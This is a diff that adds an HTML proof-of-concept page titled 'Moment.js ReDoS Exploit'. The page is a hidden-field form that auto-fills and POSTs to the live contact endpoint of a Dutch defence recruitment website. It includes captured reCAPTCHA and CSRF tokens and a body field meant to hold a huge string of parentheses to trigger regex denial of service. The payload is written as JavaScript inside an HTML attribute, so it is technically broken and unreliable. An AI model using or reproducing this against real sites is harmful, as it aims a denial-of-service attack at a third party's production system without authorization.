@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ReDoS PoC</title>
+</head>
+<body>
+    <h1>Moment.js ReDoS Exploit</h1>
+    <form action="https://werkenbijdefensie.nl/contact/stuur-een-mail" method="POST">
+        <input type="hidden" name="_recaptcha" value="03AFcWeA7kzVRiZ4K1M6J4eivJT2MIjnpf-j__p8MN7HKaHTqrDO7aZwg9XhYB2BrTyxC6tXGsvhPCNaeHNj0PwV_4c_CPj4zxaxpJJGw3IsDqxOrbLW0xUvUR5KEw0vIV0pReZ4w11umV6MewR6Bw6ONA_2FTgc31UAv0AHiS1703MCzTDYZq-XsAK4NSiE2PaO8IO3VsqkulXmAfTANi7QsFa1F5jN90kvZlrgeTMZS_6jrlSUWeSLGOJ-3VQ9iQq5QVDzk_5PIUvJdaaK9yOUIWEniB5fGUQt-J2EbS19N8RBAS-eDjowLErxuhXKtbaRaZKP0Md9JpiBUhFXr2r9eZqV-a4E9hESkTOdzdGCp6VbCK0CvK_KJN1BKihMIwA-EDIncJ6CBNkG9iiXaRrLpLqtUNEeMXQeDZHi5vk6AdpgOAMyeNP6ZIFHAXR1PkHh2v0ulWLhrDBpHrW1FzQI2uAKMzI_3WUO-d7Xes-UfR1RNzDErxxXEXy_lYTkKLvjXeCrCoFBuwSpxHXQs0P7klnEid2Cmo_UzrKtSqHS4a3T5_QMsfzCAKifJJhF7VceZkOMuJ0F1IiMYtD34A2S3olAgqHe9JieObmqA6-j16sKh-w5J0xiY0JuAbRe4va9ISd3UWbDotjgACIGaNaB2pxU-kIjZcMZeofCJ36rbTy1-s1sM8_55gTIcC8J7-qG3zcvFG_3_SakDS53ajUfd2w6GlVo5j7Epx4jWyH3VUapDsFFGJvgBHVRlhoL98u1tYuO-5sGu6I9kR7cbGfQ4_6X7bFN1XjV6B4wNepyRrlfZR4SEWXH3JcC_my2rY-gZ1tFpqxi5tnyCryIJ-eD2grseoyMwXNg">
+        <input type="hidden" name="name" value="Exploit">
+        <input type="hidden" name="email" value="exploit@example.com">
+        <input type="hidden" name="subject" value="ReDoS Test">
+        <input type="hidden" name="body" value="(".repeat(500000)">
+        <input type="hidden" name="date_of_birth_day" value="01">
+        <input type="hidden" name="date_of_birth_month" value="01">
+        <input type="hidden" name="date_of_birth_year" value="1990">
+        <input type="hidden" name="zipcode" value="12345">
+        <input type="hidden" name="phone_number" value="1234567890">
+        <input type="hidden" name="body_vacancy" value="Test Vacancy">
+        <input type="hidden" name="internal_education_id" value="12">
+        <input type="hidden" name="armed_force_id" value="10">
+        <input type="hidden" name="_token" value="5Jw4KkMmM504YnScRuXOOs0XYV3HnfybQqHZzO5w">
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
